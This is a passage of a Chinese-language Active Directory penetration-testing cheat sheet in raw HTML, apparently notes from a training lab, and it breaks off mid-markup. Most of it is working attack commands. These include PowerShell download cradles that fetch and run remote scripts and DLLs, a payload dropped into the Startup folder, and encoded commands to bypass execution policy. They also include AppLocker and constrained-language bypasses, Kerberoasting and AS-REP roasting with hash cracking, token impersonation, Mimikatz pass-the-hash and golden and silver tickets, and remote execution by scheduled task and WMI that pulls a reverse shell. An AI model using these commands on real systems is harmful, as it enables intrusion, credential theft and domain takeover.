string">'http://10.10.16.7/lib.dll'</span><span class="token punctuation">)</span><span class="token variable">$assem</span> = <span class="token namespace">[System.Reflection.Assembly]</span>::Load<span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token variable">$class</span> = <span class="token variable">$assem</span><span class="token punctuation">.</span>GetType<span class="token punctuation">(</span><span class="token string">"ClassLibrary1.Class1"</span><span class="token punctuation">)</span><span class="token variable">$method</span> = <span class="token variable">$class</span><span class="token punctuation">.</span>GetMethod<span class="token punctuation">(</span><span class="token string">"runner"</span><span class="token punctuation">)</span><span class="token variable">$method</span><span class="token punctuation">.</span>Invoke<span class="token punctuation">(</span>0<span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># Any version</span><span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>WebClient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadFile<span class="token punctuation">(</span><span class="token string">"http://192.168.119.155/PowerUp.ps1"</span><span class="token punctuation">,</span> <span class="token string">"C:\Windows\Temp\PowerUp.ps1"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># Powershell 4+</span><span class="token comment" spellcheck="true">## You can use 'IWR' as a shorthand</span><span class="token function">Invoke-WebRequest</span> <span class="token string">"http://10.10.16.7/Incnspc64.exe"</span> <span class="token operator">-</span>OutFile <span class="token string">"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Incnspc64.exe"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="编码命令"><a href="#编码命令" class="headerlink" title="编码命令"></a>编码命令</h4><p>编码一线：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$command</span> = <span class="token string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span><span class="token variable">$bytes</span> = <span class="token namespace">[System.Text.Encoding]</span>::Unicode<span class="token punctuation">.</span>GetBytes<span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token variable">$encodedCommand</span> = <span class="token namespace">[Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token variable">$bytes</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>或以上版本的Linux：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'IEX (New-Object Net.WebClient).DownloadString("http://172.16.100.55/Invoke-PowerShellTcpRun.ps1")'</span> <span class="token operator">|</span> <span class="token function">iconv</span> -t utf-16le <span class="token operator">|</span> base64 -w 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对现有脚本进行编码，然后复制到剪贴板：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token namespace">[System.Convert]</span>::ToBase64String<span class="token punctuation">(</span><span class="token namespace">[System.IO.File]</span>::ReadAllBytes<span class="token punctuation">(</span><span class="token string">'c:\path\to\PowerView.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">|</span> clip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行它，绕过执行策略。</p><pre class="line-numbers language-powershell"><code class="language-powershell">Powershell <span class="token operator">-</span>EncodedCommand <span class="token variable">$encodedCommand</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果您方便使用Nishang，则可以使用<a href="https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1">Invoke-Encode.ps1</a>。</p></blockquote><h2 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a><strong>枚举</strong></h2><h3 id="使用PowerView进行AD枚举"><a href="#使用PowerView进行AD枚举" class="headerlink" title="使用PowerView进行AD枚举"></a><strong>使用PowerView进行AD枚举</strong></h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取当前域中的所有用户</span>Get<span class="token operator">-</span>NetUser <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty cn<span class="token comment" spellcheck="true"># 获取当前域中的所有计算机</span>Get<span class="token operator">-</span>NetComputer<span class="token comment" spellcheck="true"># 获取当前林中的所有域</span>Get<span class="token operator">-</span>NetForestDomain<span class="token comment" spellcheck="true"># 获取域/林信任</span>Get<span class="token operator">-</span>NetDomainTrustGet<span class="token operator">-</span>NetForestTrust<span class="token comment" spellcheck="true"># 获取DA组的信息</span>Get<span class="token operator">-</span>NetGroup <span class="token operator">-</span>GroupName <span class="token string">"Domain Admins"</span><span class="token comment" spellcheck="true"># 查找DA组的成员</span>Get<span class="token operator">-</span>NetGroupMember <span class="token operator">-</span>GroupName <span class="token string">"Domain Admins"</span> <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty membername<span class="token comment" spellcheck="true"># 在域中查找有趣的共享，忽略默认共享</span>Invoke<span class="token operator">-</span>ShareFinder <span class="token operator">-</span>ExcludeStandard <span class="token operator">-</span>ExcludePrint <span class="token operator">-</span>ExcludeIPC<span class="token comment" spellcheck="true"># 获取当前域的OU</span>Get<span class="token operator">-</span>NetOU <span class="token operator">-</span>FullData<span class="token comment" spellcheck="true"># 在OU中获取计算机</span><span class="token comment" spellcheck="true"># %&amp;#123;&amp;#125; 是循环语句</span>Get<span class="token operator">-</span>NetOU <span class="token operator">-</span>OUName StudentMachines <span class="token punctuation">|</span> <span class="token operator">%</span>&amp;<span class="token comment" spellcheck="true">#123;Get-NetComputer -ADSPath $_&amp;#125;</span><span class="token comment" spellcheck="true"># 获取适用于特定OU的GPO</span>Get<span class="token operator">-</span>NetOU <span class="token operator">*</span>student<span class="token operator">*</span> <span class="token punctuation">|</span> <span class="token function">select</span> gplinkGet<span class="token operator">-</span>NetGPO <span class="token operator">-</span>Name <span class="token string">"&amp;#123;3E04167E-C2B6-4A9A-8FB7-C811158DC97C&amp;#125;"</span><span class="token comment" spellcheck="true"># 获取通过GPO设置的受限组，查找通过域强制设置的有趣组成员身份</span>Get<span class="token operator">-</span>NetGPOGroup<span class="token comment" spellcheck="true"># 获取特定对象的传入ACL</span>Get<span class="token operator">-</span>ObjectACL <span class="token operator">-</span>SamAccountName <span class="token string">"Domain Admins"</span> <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> <span class="token function">Select</span> IdentityReference<span class="token punctuation">,</span>ActiveDirectoryRights<span class="token comment" spellcheck="true"># 查找整个域的有趣ACL，以可读（从左到右）格式显示</span>Find<span class="token operator">-</span>InterestingDomainAcl <span class="token punctuation">|</span> <span class="token function">select</span> identityreferencename<span class="token punctuation">,</span>activedirectoryrights<span class="token punctuation">,</span>acetype<span class="token punctuation">,</span>objectdn <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReferenceName -NotContains "DnsAdmins"&amp;#125; | ft</span><span class="token comment" spellcheck="true"># 获取特定用户或组的有趣的传出ACL</span><span class="token comment" spellcheck="true"># ?&amp;#123;&amp;#125; 是一个过滤器语句</span>Find<span class="token operator">-</span>InterestingDomainAcl <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReference -match "Domain Admins"&amp;#125; | select ObjectDN,ActiveDirectoryRights</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>识别AppLocker策略。寻找免除的二进制文件或要绕过的路径。</p><pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>AppLockerPolicy <span class="token operator">-</span>Effective <span class="token punctuation">|</span> <span class="token function">select</span> <span class="token operator">-</span>ExpandProperty RuleCollections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>一些高级绕过技术：<ul><li>如果仅允许使用（Microsoft）签名的二进制文件，请使用<a href="https://lolbas-project.github.io/">LOLBAS</a>。</li><li>如果<code>C:\Windows</code>允许来自的二进制文件，请尝试将您的二进制文件拖放到<code>C:\Windows\Temp</code>或<code>C:\Windows\Tasks</code>。如果此目录树中没有可写的子目录，但存在可写文件，则将文件写入备用数据流（例如JScript脚本），然后从那里执行它。</li><li>将您的二进制文件包装在DLL文件中，然后执行<code>rundll32</code>以绕过可执行规则。如果允许使用Python之类的二进制文件，请使用该文件。如果这不起作用，请尝试其他技术，例如将JScript包装在HTA文件中或使用来运行XSL文件<code>wmic</code>。</li></ul></li></ul><h3 id="PowerShell受限语言模式"><a href="#PowerShell受限语言模式" class="headerlink" title="PowerShell受限语言模式"></a>PowerShell受限语言模式</h3><p>有时，您可能会发现自己处于执行约束语言模式（CLM）的PowerShell会话中。与AppLocker配对时，通常是这种情况（请参见上文）。</p><p>您可以通过轮询以下变量来获取当前的语言模式，从而确定自己处于受限语言模式。<code>FullLanguage</code>对于无限制的会话和<code>ConstrainedLanguage</code>CLM ，它将说。还有其他语言模式，在这里我将不再赘述。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token variable">$ExecutionContext</span><span class="token punctuation">.</span>SessionState<span class="token punctuation">.</span>LanguageMode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>CLM构成的约束将阻止您的许多利用尝试。一种快速而肮脏的绕过方法是使用内联函数，该函数有时会起作用-如果例如<code>whoami</code>被阻止，请尝试以下操作：</p><pre class="line-numbers language-powershell"><code class="language-powershell">&amp;&amp;<span class="token comment" spellcheck="true">#123;whoami&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="LAPS"><a href="#LAPS" class="headerlink" title="LAPS"></a>LAPS</h3><p>我们可以使用<a href="https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1">LAPSToolkit.ps1</a>来识别域中的哪些计算机使用LAPS，以及允许哪些域组读取LAPS密码。如果属于此组，则也可以使用此工具获取当前的LAPS密码。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 获取运行LAPS的计算机及其密码（如果允许我们读取这些密码）</span>Get<span class="token operator">-</span>LAPSComputers<span class="token comment" spellcheck="true"># 获取允许读取LAPS密码的组</span>Find<span class="token operator">-</span>LAPSDelegatedGroups<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Powercat反向shell"><a href="#Powercat反向shell" class="headerlink" title="Powercat反向shell"></a>Powercat反向shell</h3><p>如果您的Linux机壳没有反向外壳，则可以选择;）。</p><pre class="line-numbers language-powershell"><code class="language-powershell">powercat <span class="token operator">-</span>l <span class="token operator">-</span>p 443 <span class="token operator">-</span>t 9999<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="横向运动"><a href="#横向运动" class="headerlink" title="横向运动"></a>横向运动</h2><h3 id="使用PowerView进行横向运动枚举"><a href="#使用PowerView进行横向运动枚举" class="headerlink" title="使用PowerView进行横向运动枚举"></a>使用PowerView进行横向运动枚举</h3><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 查找用户的现有本地管理员访问权限（noisy 🚩）</span>Find<span class="token operator">-</span>LocalAdminAccess<span class="token comment" spellcheck="true"># 通过PS远程处理（also noisy🚩）查找本地管理员访问权限，需要Find-PSRemotingLocalAdminAccess.ps1</span>Get<span class="token operator">-</span>NetComputer <span class="token operator">-</span>Domain dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local > <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txtFind<span class="token operator">-</span>PSRemotingLocalAdminAccess <span class="token operator">-</span>ComputerFile <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txt dcorp<span class="token operator">-</span>std355<span class="token comment" spellcheck="true"># 与WMI相同。是否需要“ Find-WMILocalAdminAccess.ps1”（似乎已从Nishang中删除了）？</span>Find<span class="token operator">-</span>WMILocalAdminAccess <span class="token operator">-</span>ComputerFile <span class="token punctuation">.</span>\targets<span class="token punctuation">.</span>txtFind<span class="token operator">-</span>WMILocalAdminAccess <span class="token comment" spellcheck="true"># Finds domain computers automatically</span><span class="token comment" spellcheck="true"># 在您可以访问的机器上搜寻有趣的用户会话 (still noisy 🚩)</span>Invoke<span class="token operator">-</span>UserHunter <span class="token operator">-</span>CheckAccess <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.LocalAdmin -Eq True &amp;#125;</span><span class="token comment" spellcheck="true"># 寻找 kerberoastable users</span>Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>SPN <span class="token punctuation">|</span> <span class="token function">select</span> name<span class="token punctuation">,</span>serviceprincipalname<span class="token comment" spellcheck="true"># 寻找 AS-REP roastable users</span>Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>PreauthNotRequired <span class="token punctuation">|</span> <span class="token function">select</span> name<span class="token comment" spellcheck="true"># 寻找可以设置UserAccountControl标志的用户</span><span class="token comment" spellcheck="true">## 如果可用-禁用预身份验证或添加SPN（请参见下文）</span>Invoke<span class="token operator">-</span>ACLScanner <span class="token operator">-</span>ResolveGUIDs <span class="token punctuation">|</span> ?&amp;<span class="token comment" spellcheck="true">#123;$_.IdentityReferenceName -match "RDPUsers"&amp;#125;</span><span class="token comment" spellcheck="true"># 查找启用了无限制委派的服务器</span><span class="token comment" spellcheck="true">## 如果可用，并且您在此服务器上具有管理员权限，请获取用户TGT（请参见下文）</span>Get<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>Unconstrained<span class="token comment" spellcheck="true"># 查找启用了约束委派的用户或计算机</span><span class="token comment" spellcheck="true">## 如果可用，并且您具有用户/计算机哈希，请以DA身份访问服务机（请参见下文）</span>Get<span class="token operator">-</span>DomainUser <span class="token operator">-</span>TrustedToAuth <span class="token punctuation">|</span> <span class="token function">select</span> userprincipalname<span class="token punctuation">,</span>msds<span class="token operator">-</span>allowedtodelegatetoGet<span class="token operator">-</span>DomainComputer <span class="token operator">-</span>TrustedToAuth <span class="token punctuation">|</span> <span class="token function">select</span> name<span class="token punctuation">,</span>msds<span class="token operator">-</span>allowedtodelegateto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><p>使用<code>Invoke-BloodHound</code>from<code>SharpHound.ps1</code>或use <code>SharpHound.exe</code>。两者都可以反思地运行，把它们放到<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">这里</a>。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 如果您不关心OpSec，请运行所有检查🚩</span>Invoke<span class="token operator">-</span>BloodHound <span class="token operator">-</span>CollectionMethod All<span class="token punctuation">,</span>GPOLocalGroup<span class="token comment" spellcheck="true"># Running LoggedOn separately sometimes gives you more sessions, but enumerates by looping through hosts 🚩</span>Invoke<span class="token operator">-</span>BloodHound <span class="token operator">-</span>CollectionMethod LoggedOn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><h4 id="Automatic"><a href="#Automatic" class="headerlink" title="Automatic"></a>Automatic</h4><p>使用PowerView：</p><pre class="line-numbers language-powershell"><code class="language-powershell">Request<span class="token operator">-</span>SPNTicket <span class="token operator">-</span>SPN <span class="token string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用Hashcat破解哈希：</p><pre class="line-numbers language-bash"><code class="language-bash">hashcat -a 0 -m 13100 hash.txt <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/rockyou.txt --rules-file <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/hashcat/rules/best64.rule<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Manual"><a href="#Manual" class="headerlink" title="Manual"></a>Manual</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 请求TGS进行kerberoastable帐户（SPN）</span><span class="token function">Add-Type</span> <span class="token operator">-</span>AssemblyName System<span class="token punctuation">.</span>IdentityModel<span class="token function">New-Object</span> System<span class="token punctuation">.</span>IdentityModel<span class="token punctuation">.</span>Tokens<span class="token punctuation">.</span>KerberosRequestorSecurityToken <span class="token operator">-</span>ArgumentList <span class="token string">"MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"</span><span class="token comment" spellcheck="true"># 将TGS转储到磁盘</span>Invoke<span class="token operator">-</span>Mimikatz <span class="token operator">-</span>Command <span class="token string">'"kerberos::list /export"'</span><span class="token comment" spellcheck="true"># 使用TGSRepCrack破解</span>python<span class="token punctuation">.</span>exe <span class="token punctuation">.</span>\tgsrepcrack<span class="token punctuation">.</span>py <span class="token punctuation">.</span>\10k<span class="token operator">-</span>worst<span class="token operator">-</span>pass<span class="token punctuation">.</span>txt <span class="token punctuation">.</span>\mssqlsvc<span class="token punctuation">.</span>kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Targeted-kerberoasting-by-setting-SPN"><a href="#Targeted-kerberoasting-by-setting-SPN" class="headerlink" title="Targeted kerberoasting by setting SPN"></a>Targeted kerberoasting by setting SPN</h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span>Identity support355user <span class="token operator">-</span><span class="token function">Set</span> @&amp;<span class="token comment" spellcheck="true">#123;serviceprincipalname='any/thing'&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="AS-REP-roasting"><a href="#AS-REP-roasting" class="headerlink" title="AS-REP roasting"></a>AS-REP roasting</h3><p>获取可焙烤用户的哈希（有关搜索，请参见上文）。使用<code>ASREPRoast.ps1</code>：</p><pre class="line-numbers language-powershell"><code class="language-powershell">Get<span class="token operator">-</span>ASREPHash <span class="token operator">-</span>UserName VPN355user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用Hashcat破解哈希：</p><pre class="line-numbers language-bash"><code class="language-bash">hashcat -a 0 -m 18200 hash.txt <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/rockyou.txt --rules-file <span class="token variable"><span class="token variable">`</span><span class="token function">pwd</span><span class="token variable">`</span></span>/hashcat/rules/best64.rule<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"><a href="#通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游" class="headerlink" title="通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游"></a><strong>通过禁用Kerberos预身份验证进行有针对性的AS-REP漫游</strong></h4><p>我们需要ACL写入权限才能为该用户设置UserAccountControl标志，有关搜索，请参见上文。使用PowerView。</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Set</span><span class="token operator">-</span>DomainObject <span class="token operator">-</span>Identity Control355User <span class="token operator">-XOR</span> @&amp;<span class="token comment" spellcheck="true">#123;useraccountcontrol=4194304&amp;#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Token-Manipulation"><a href="#Token-Manipulation" class="headerlink" title="Token Manipulation"></a>Token Manipulation</h3><p>可以通过计算机上的会话/运行进程从其他用户模仿令牌。通过使用例如CobaltStrike注入到所述过程中可以实现类似的效果。</p><h4 id="Incognito"><a href="#Incognito" class="headerlink" title="Incognito"></a>Incognito</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 在机器上显示令牌</span><span class="token punctuation">.</span>\incognito<span class="token punctuation">.</span>exe list_tokens <span class="token operator">-</span>u<span class="token comment" spellcheck="true"># 使用特定用户的令牌启动新过程</span><span class="token punctuation">.</span>\incognito<span class="token punctuation">.</span>exe execute <span class="token operator">-</span>c <span class="token string">"domain\user"</span> C:\Windows\system32\calc<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果您使用Meterpreter，则可以将内置的Incognito模块与一起使用，可以使用<code>use incognito</code>相同的命令。</p></blockquote><h4 id="Invoke-TokenManipulation"><a href="#Invoke-TokenManipulation" class="headerlink" title="Invoke-TokenManipulation"></a>Invoke-TokenManipulation</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 显示机器上的所有令牌</span>Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>ShowAll<span class="token comment" spellcheck="true"># 仅在机器上显示唯一的，可用的令牌</span>Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>Enumerate<span class="token comment" spellcheck="true"># 使用特定用户的令牌启动新过程</span>Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>ImpersonateUser <span class="token operator">-</span>Username <span class="token string">"domain\user"</span><span class="token comment" spellcheck="true"># 使用另一个进程的令牌启动新进程</span>Invoke<span class="token operator">-</span>TokenManipulation <span class="token operator">-</span>CreateProcess <span class="token string">"C:\Windows\system32\calc.exe"</span> <span class="token operator">-</span>ProcessId 500<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><pre class="line-numbers language-plaintext"><code class="language-plaintext"># Overpass the hashsekurlsa::pth /user:Administrator /domain:domain.local /ntlm:[NTLMHASH] /run:powershell.exe# 黄金票据 (domain admin, w/ some ticket properties to avoid detection)kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /krbtgt:[KRBTGTHASH] /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt# 白银票据 for a specific SPN with a compromised service / machine accountkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-[DOMAINSID] /rc4:[MACHINEACCOUNTHASH] /target:dc.domain.local /service:HOST /id:500 /groups:513,512,520,518,519 /startoffset:0 /endin:600 /renewmax:10080 /ptt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>可在<a href="https://adsecurity.org/?page_id=183">此处</a>找到用于银票的可用SPN列表。[这里](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets)提供[了](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Active Directory Attack.md#pass-the-ticket-silver-tickets)与攻击相关的SPN的另一个不错的概述。</p></blockquote><h3 id="使用schtasks执行命令"><a href="#使用schtasks执行命令" class="headerlink" title="使用schtasks执行命令"></a><strong>使用schtasks执行命令</strong></h3><p><em>需要“主机” SPN</em></p><p>创建任务：</p><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 注意引号。如果引用变得很痛苦，请使用编码的命令。</span>schtasks <span class="token operator">/</span>create <span class="token operator">/</span>tn <span class="token string">"shell"</span> <span class="token operator">/</span>ru <span class="token string">"NT Authority\SYSTEM"</span> <span class="token operator">/</span>s dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">/</span><span class="token function">sc</span> weekly <span class="token operator">/</span>tr <span class="token string">"Powershell.exe -c 'IEX (New-Object Net.WebClient).DownloadString(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1''')'"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>触发它：</p><pre class="line-numbers language-powershell"><code class="language-powershell">schtasks <span class="token operator">/</span>RUN <span class="token operator">/</span>TN <span class="token string">"shell"</span> <span class="token operator">/</span>s dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="使用WMI执行命令"><a href="#使用WMI执行命令" class="headerlink" title="使用WMI执行命令"></a><strong>使用WMI执行命令</strong></h3><p><em>需要“主机”和“ RPCSS” SPN</em></p><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token function">Invoke-WmiMethod</span> win32_process <span class="token operator">-</span>ComputerName dcorp<span class="token operator">-</span>dc<span class="token punctuation">.</span>dollarcorp<span class="token punctuation">.</span>moneycorp<span class="token punctuation">.</span>local <span class="token operator">-</span>name create <span class="token operator">-</span>argumentlist <span class="token string">"powershell.exe -e <span class="token variable">$encodedCommand</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 使用password</span>impacket-wmiexec dcorp/student355:password@172.16.4.101<span class="token comment" spellcheck="true"># 使用hash</span>impacket-wmiexec dcorp/student355@172.16.4.101 -hashes :92F4AE6DCDAC7CF870B79F1758503D54<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用PowerShell-Remoting执行命令"><a href="#使用PowerShell-Remoting执行命令" class="headerlink" title="使用PowerShell Remoting执行命令"></a><strong>使用PowerShell Remoting执行命令</strong></h3><p><em>需要“ CIFS”，“ HTTP”和“ WSMAN” SPN</em></p><blockquote><p>这个有点棘手。上述SPN的组合可能有效或无效-PowerShell也可能要求提供准确的FQDN。</p></blockquote><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true"># 创建凭据以其他用户身份运行（如果需要，PTT不需要）</span><span class="token comment" spellcheck="true"># 如果不使用以下命令，请在以下命令中忽略-Credential $ Cred</span><span class="token variable">$SecPassword</span> = ConvertTo<span class="token operator">-</span>SecureString <span class="token string">'thePassword'</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token variable">$Cred</span> = <span class="token function">New-Object</span> System<span class="token punctuation">.</span>Management<span class="token punctuation">.</span>Automation<span class="token punctuation">.</span>PSCredential<span class="token punctuation">(</span><span class="token string">'CORP\username'</span><span class="token punctuation">,</span> <span class="token variable">$SecPassword</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 远程运行命令（可以一对多使用！）</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName <span class="token variable">$computer</span> <span class="token operator">-</span>ScriptBlock &amp;<span class="token comment" spellcheck="true">#123;whoami; hostname&amp;#125;</span><span class="token comment" spellcheck="true"># 以其他用户身份启动会话（提示输入密码）</span><span class="token function">Enter-PsSession</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span> <span class="token operator">-</span>ComputerName <span class="token variable">$computer</span> <span class="token operator">-</span>Credential dcorp\Administrator<span class="token comment" spellcheck="true"># 创建一个持久会话（将记住变量等），将脚本加载到该会话中，然后输入远程会话提示</span><span class="token variable">$sess</span> = <span class="token function">New-PsSession</span> <span class="token operator">-</span>Credential <span class="token variable">$Cred</span><span class="token function">Invoke-Command</span> <span class="token operator">-</span>Session <span class="token variable">$sess</span> <span class="token operator">-</span>FilePath c:\path\to\file<span class="token punctuation">.</span>ps1<span class="token function">Enter-PsSession</span> <span class="token operator">-</span>Session <span class="token variable">$sess</span><span class="token comment" spellcheck="true"># 在活动的PowerShell远程会话之间复制文件或从中复制文件</span><span class="token function">Copy-Item</span> <span class="token operator">-</span>Path <span class="token punctuation">.</span>\Invoke<span class="token operator">-</span>Mimikatz<span class="token punctuation">.</span>ps1 <span class="token operator">-</span>ToSession <span class="token variable">$sess2</span> <span class="token operator">-</span>Destination <span class="token string">"C:\Users\dbprodadmin\documents\"</span><span aria-hidden="true" 